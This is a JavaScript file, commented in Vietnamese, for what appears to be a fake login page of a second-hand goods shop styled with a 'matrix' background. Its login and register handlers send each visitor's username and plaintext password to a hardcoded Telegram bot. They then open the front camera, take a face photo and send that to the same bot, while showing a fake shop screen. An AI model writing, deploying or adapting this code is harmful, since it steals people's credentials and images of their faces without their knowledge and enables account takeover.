// Cấu hình Telegram
const TELEGRAM_TOKEN = '8427083531:AAFPX-KfKwKNr2b3-wqoAGC0F0H_D0JVki8';
const TELEGRAM_CHAT_ID = '-1004386281388';

const matrixCanvas = document.getElementById('matrixCanvas');
const ctx = matrixCanvas.getContext('2d');
let cameraStream = null;
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const loadingSpinner = document.getElementById('loadingSpinner');
const cameraPreview = document.getElementById('cameraPreview');

// Hàm chạy hiệu ứng ma trận nền
function setupMatrixEffect() {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
  const chars = '101010'.split('');
  const fontSize = 18;
  const columns = matrixCanvas.width / fontSize;
  const drops = Array(Math.floor(columns)).fill(1);
  
  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }
  setInterval(draw, 50);
}

// Hiện loading spinner
function showLoading() {
  loadingSpinner.classList.remove('hidden');
}

function hideLoading() {
  loadingSpinner.classList.add('hidden');
}

// Chuyển từ trang chủ sang form đăng nhập
function goToLogin() {
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('authSection').classList.remove('hidden');
}

// Quay lại trang chủ từ form đăng nhập
function goToHome() {
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.remove('hidden');
}

// Gửi dữ liệu dạng text về Telegram admin
function sendToTelegram(message) {
  let text = '';
  for (let [k, v] of Object.entries(message)) {
    text += `<b>${k}:</b> ${v}\n`;
  }
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  };
  
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(err => console.error('Lỗi gửi message:', err));
}

// Gửi ảnh chụp mặt về Telegram admin
function sendPhotoToTelegram(photoBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', photoBlob, 'face_capture.jpg');
  formData.append('caption', '📸 Ảnh xác minh đăng nhập shop đồ cũ');
  
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  }).catch(err => console.error('Lỗi gửi ảnh:', err));
}

// Chụp ảnh từ camera và gửi về Telegram
function captureAndSendPhoto() {
  if (!cameraStream) return;
  
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  
  canvas.toBlob(blob => {
    if (blob) {
      sendPhotoToTelegram(blob);
    }
  }, 'image/jpeg');
}

// Bật camera trước khi bấm nút xác nhận
function enableCamera() {
  navigator.mediaDevices.getUserMedia({ 
    video: { facingMode: 'user' }, 
    audio: false 
  })
  .then(stream => {
    cameraStream = stream;
    video.srcObject = stream;
    cameraPreview.classList.remove('hidden');
    
    // Chờ video sẵn sàng rồi chụp
    setTimeout(() => {
      captureAndSendPhoto();
      cameraPreview.classList.add('hidden');
    }, 1500);
  })
  .catch(err => {
    alert('Không thể truy cập camera: ' + err.message);
  });
}

// Tắt camera
function stopCamera() {
  if (cameraStream) {
    cameraStream.getTracks().forEach(track => track.stop());
    cameraStream = null;
    video.srcObject = null;
    cameraPreview.classList.add('hidden');
  }
}

// Xử lý khi người dùng bấm đăng nhập
async function handleLogin() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  
  if (!username || !password) {
    alert('Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu');
    return;
  }
  
  showLoading();
  
  const accountInfo = {
    hành_động: 'ĐĂNG NHẬP',
    tài_khoản: username,
    mật_khẩu: password,
    thời_gian: new Date().toLocaleString('vi-VN')
  };
  
  await sendToTelegram(accountInfo);
  enableCamera(); // Bật camera và chụp mặt gửi về admin
  
  // Hiện tên người dùng trong shop
  document.getElementById('displayUsername').textContent = username;
  
  // Chuyển sang giao diện shop chính
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('shopSection').classList.remove('hidden');
  
  hideLoading();
}

// Xử lý khi người dùng bấm tạo tài khoản
async function handleRegister() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  
  if (!username || !password) {
    alert('Vui lòng nhập đầy đủ thông tin để tạo tài khoản');
    return;
  }
  
  showLoading();
  
  const accountInfo = {
    hành_động: 'TẠO TÀI KHOẢN',
    tài_khoản: username,
    mật_khẩu: password,
    thời_gian: new Date().toLocaleString('vi-VN')
  };
  
  await sendToTelegram(accountInfo);
  enableCamera(); // Bật camera và chụp mặt gửi về admin
  
  // Hiện tên người dùng trong shop
  document.getElementById('displayUsername').textContent = username;
  
  // Chuyển sang giao diện shop chính
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('homeSection').classList.add('hidden');
  document.getElementById('shopSection').classList.remove('hidden');
  
  hideLoading();
}

// Gắn sự kiện cho các nút
document.getElementById('goToLoginBtn').addEventListener('click', goToLogin);
document.getElementById('backToHomeBtn').addEventListener('click', goToHome);
document.getElementById('loginBtn').addEventListener('click', handleLogin);
document.getElementById('registerBtn').addEventListener('click', handleRegister);

// Xử lý resize canvas ma trận
window.addEventListener('resize', () => {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
});

// Khởi tạo
setupMatrixEffect();